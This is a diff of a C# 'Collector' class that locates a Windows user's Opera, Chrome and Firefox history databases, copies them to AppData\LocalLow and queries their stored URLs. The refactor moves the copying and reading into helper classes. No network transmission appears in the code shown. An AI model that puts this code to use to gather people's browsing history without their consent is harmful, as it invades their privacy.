@@ -1,66 +1,70 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-using System.Data.SQLite;
 using System.IO;
-
 
 
 namespace Collector
 {
     class Locator
     {
-        string username = Environment.UserName;
-        string domain = Environment.UserDomainName;
-        string currentUsername;
-        int i; 
+     
         string source;
         string destination;
+        static string username = Environment.UserName;
+        static string domain = Environment.UserDomainName;
+        string user = Username(username,domain);
 
-        public void VariableDirectory()
+        // Evaluate if directory exists
+        public static bool dirExists(string dir)
         {
-            // check if there is a directory with username.domain(foobar.NTHDOMAIN) as folder name under Users.
-            // if none use username only (foobar)
-            if (File.Exists(@"C:\Users\" + username+"."+domain))
+            if (Directory.Exists(dir))
             {
-                // username.domain
-               currentUsername = username+"."+domain;                
+                return true;
             }
-            else
-            {
-                // username
-               currentUsername = username;
-            }    
-                  
+            return false;
         }
 
+        // Get the exact path of current user
+        public static string Username(string username, string domain)
+        {
+            if(dirExists(@"C:\Users\" + username + "." + domain))
+            {
+                return username + "." + domain;
+            }
+            // return username;
+            else
+            {
+                return username;
+            }
+           
+        }       
+        
         public void OperaLocator()
         {
             // Opera source file and destination file
-            string sourceOpera = @"C:\Users\" + currentUsername + @"\AppData\Roaming\Opera Software\Opera Stable\History";
+            string sourceOpera = @"C:\Users\" + user + @"\AppData\Roaming\Opera Software\Opera Stable\History";
             source = sourceOpera;
-            destination = @"C:\Users\" + currentUsername + @"\AppData\LocalLow\Temp\h_opera";
-            i = -1;
+            destination = @"C:\Users\" + user + @"\AppData\LocalLow\h_opera";         
+            new FileCopy(source, destination);
+            new FileReader("select * from urls", destination);
         }
 
         public void ChromeLocator()
         {
             // Chrome source file and destination file
-            string sourceChrome = @"C:\Users\" + currentUsername + @"\AppData\Local\Google\Chrome\User Data\Default\History";
-            destination = @"C:\Users\" + currentUsername + @"\AppData\LocalLow\Temp\h_chrome";
-            source = sourceChrome;
-            i = 0;
+            string sourceChrome = @"C:\Users\" + user + @"\AppData\Local\Google\Chrome\User Data\Default\History";
+            destination = @"C:\Users\" + user + @"\AppData\LocalLow\h_chrome";
+            source = sourceChrome;           
+            new FileCopy(source,destination);
+            new FileReader("select * from urls", destination);
         }
     
         public void MozillaLocator()
         {
-
             // Mozilla source file and destination file
             // Mozilla Firefox has a unique naming of application data
             string partial_path = ".default";
-            string sourceMozilla = @"C:\Users\" + currentUsername + @"\AppData\Roaming\Mozilla\Firefox\Profiles\";
+            string sourceMozilla = @"C:\Users\" + user + @"\AppData\Roaming\Mozilla\Firefox\Profiles\";
 
              DirectoryInfo dirInfo = new DirectoryInfo(sourceMozilla);
             // Get directories containg .default word
@@ -74,72 +78,12 @@ namespace Collector
             // Console.WriteLine(unique_dir[0]);
             // build the origin of the file
             source = sourceMozilla + unique_dir[0] + @"\places.sqlite";
-            destination = @"C:\Users\" + currentUsername + @"\AppData\LocalLow\Temp\h_mozilla";
-            i = 1;
+            destination = @"C:\Users\" + user + @"\AppData\LocalLow\h_mozilla";
+            new FileCopy(source, destination);
+            new FileReader("select * from moz_places", destination);
         }
-
-        public void Reader()
-        {
-            try
-            {
-                // Connection string
-                string[] sql = { "select * from urls", "select * from moz_places" };
-
-                SQLiteConnection con = new SQLiteConnection(@"Data Source=" + destination);
-                con.Open();
-                SQLiteCommand cmd = new SQLiteCommand();
-                cmd.Connection = con;
-                    if (i == -1 || i == 0)
-                    {
-                        // query for Opera and Chrome
-                        cmd.CommandText = sql[0];
-                    }
-                    else if (i == 1)
-                    {
-                        // query for Mozilla
-                        cmd.CommandText = sql[1];
-                    }
-                
-                SQLiteDataReader dr = cmd.ExecuteReader();
-
-                while (dr.Read())
-                {
-                    // Log history
-                    new LogWriter(dr[0].ToString() + " | " + dr[1].ToString());
-                    // Console.WriteLine(dr[0].ToString() + " | " + dr[1].ToString());                                        
-                }
-            }
-            catch(Exception ex)
-            {
-                // Console.WriteLine(ex.Message);
-                new LogWriter(ex.Message);
-            }
-        }
-
-        public void CopyFile()
-        {
-            try
-            {
-                // Create file stream variable
-                // Close filestream
-                // If not closed, will caught an exception saying file used by another process
-                // Copy file to new directory
-                var filestream = File.Create(destination);
-                filestream.Close();
-                File.Copy(source,destination,true);
-
-                Console.WriteLine(source + " copied to " + destination);
-                new  LogWriter(source + " copied to " + destination);
-                
-            }
-            catch(IOException ex)
-            {
-                // Console.WriteLine(ex.Message);
-                new LogWriter(ex.Message);
-            }
-        }
-
+     
     }
-    
+
 }
             
